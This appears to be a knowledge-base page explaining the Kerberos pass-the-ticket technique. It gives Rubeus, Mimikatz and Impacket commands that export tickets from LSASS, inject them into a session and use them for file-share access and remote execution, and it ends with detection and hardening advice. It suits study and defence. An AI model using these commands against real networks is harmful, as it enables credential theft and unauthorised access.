---
title: Pass the ticket (PtT)
slug: pass-the-ticket
---

> **TL;DR:** Inject a stolen or forged Kerberos TGT/TGS into the current logon session so any subsequent Kerberos call authenticates as the ticket's owner — works against any service that accepts Kerberos.

## What it is
Kerberos tickets are bearer tokens scoped to a principal and (for service tickets) a target SPN. If you can write a ticket into the LSA ticket cache or set `KRB5CCNAME` on Linux, the OS will present it during the next AP-REQ. PtT differs from [[overpass-the-hash]] in that you already have a ticket — no key, no AS-REQ needed. It is also the delivery mechanism for forged tickets: golden tickets, silver tickets, and S4U2self abuse all rely on PtT to use what they forge.

## Preconditions / where it applies
- A ticket in `.ccache` (MIT) or `.kirbi` (Microsoft) format — exported from LSASS, harvested from `%TEMP%`, extracted via `Rubeus dump`, or forged.
- Ticket still within its lifetime and renew window (typically 10h/7d in default policy).
- For TGTs: domain controller reachable on 88. For TGS: only the target service is needed.
- For Linux ccaches: a process you control to set `KRB5CCNAME` env var before invoking the client.

## Technique
Windows — Rubeus or Mimikatz:

```
Rubeus.exe ptt /ticket:<base64-kirbi>
# verify
klist
# then use any Kerberos-aware client
dir \\fs01\sensitive
```

Mimikatz alternative: `kerberos::ptt ticket.kirbi`. Note Rubeus `ptt` writes into the *current* LUID; for cross-session injection use `createnetonly` + `ptt` together.

Linux — convert and use:

```
# kirbi -> ccache
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=$PWD/ticket.ccache
psexec.py -k -no-pass corp.local/alice@fs01
```

Common sources of harvestable tickets: LSASS via `sekurlsa::tickets /export`, scheduled-task `.kirbi` files in `%SystemRoot%\Tasks`, and unconstrained-delegation captures.

## Detection and defence
- 4769 (TGS request) from a host that has no preceding 4768 (AS-REQ) for that user — ticket injected from elsewhere.
- TGT use from a workstation whose IP differs from the AS-REQ source IP (cross-host replay).
- Enable LSA Protection (`RunAsPPL`) and Credential Guard to harden the ticket cache.
- Short ticket lifetimes + krbtgt rotation limit the window for stolen/forged tickets.

## References
- [Pass the Ticket — the.hacker.recipes](https://www.thehacker.recipes/ad/movement/kerberos/ptt) — TGT vs TGS reuse.
- [Rubeus — GhostPack](https://github.com/GhostPack/Rubeus) — `ptt`, `asktgt`, `dump`.
- [ired.team — Pass the Ticket](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/pass-the-ticket-attack) — end-to-end lab.
